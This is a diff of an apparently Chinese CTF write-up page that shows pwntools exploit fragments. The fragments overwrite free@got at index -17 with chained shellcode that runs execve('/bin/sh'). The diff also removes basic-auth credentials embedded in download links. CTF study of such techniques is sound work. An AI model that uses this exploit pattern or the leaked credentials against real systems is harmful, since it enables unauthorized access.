@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -295,7 +295,7 @@
 </ul>
 <h3 id="编写exp">编写EXP</h3>
 <p>首先把函数写好：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -320,19 +320,17 @@
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete_note</span><span class="p">(</span><span class="n">idx</span><span class="p">:</span><span class="nb">int</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">io</span>
 </span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;your choice&gt;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;index:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;index:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>首先分配一块带有<code>/bin/sh</code>的，预备调用。然后，往索引为<code>-17</code>处分配，修改<code>free@got</code>的内容为堆地址，顺便写上一条<code>shellcode</code>，<code>xor rsi, rsi</code>。这里选用<code>\xc0</code>作为滑板指令。</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_note</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add_note</span><span class="p">(</span><span class="o">-</span><span class="mi">17</span> <span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;xor rsi, rsi&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xC0\xC0\xEB\x19</span><span class="s1">&#39;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">add_note</span><span class="p">(</span><span class="o">-</span><span class="mi">17</span> <span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;xor rsi, rsi&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xC0\xC0\xEB\x19</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>-17</code>的计算是这样的：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194202.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194202.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194202.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194202.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194202.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194202.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -344,7 +342,7 @@
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194817.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194817.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194817.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194817.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194817.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221194817.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>可以看到，<code>free@got</code>已修改成功，同时写上了<code>xor rsi,rsi; \xc0\xc0\xeb\x19</code>。</p>
 <p>然后继续写：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -353,23 +351,21 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_note</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;xor rdx, rdx&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xC0\xC0\xEB\x19</span><span class="s1">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">add_note</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov eax, 59&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xEB\x19</span><span class="s1">&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">add_note</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;syscall&#39;</span><span class="p">))</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">add_note</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;syscall&#39;</span><span class="p">))</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>之后就会：</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210451.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210451.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210451.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210451.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210451.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210451.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>最后：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">delete_note</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># get shell</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">delete_note</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># get shell</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210711.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210711.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210711.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210711.png 2x" sizes="auto" data-title="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210711.png" data-alt="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210221210711.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h4 id="完整exp">完整exp</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -430,8 +426,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">delete_note</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div></div><div class="post-footer" id="post-footer">
   <div class="post-info">
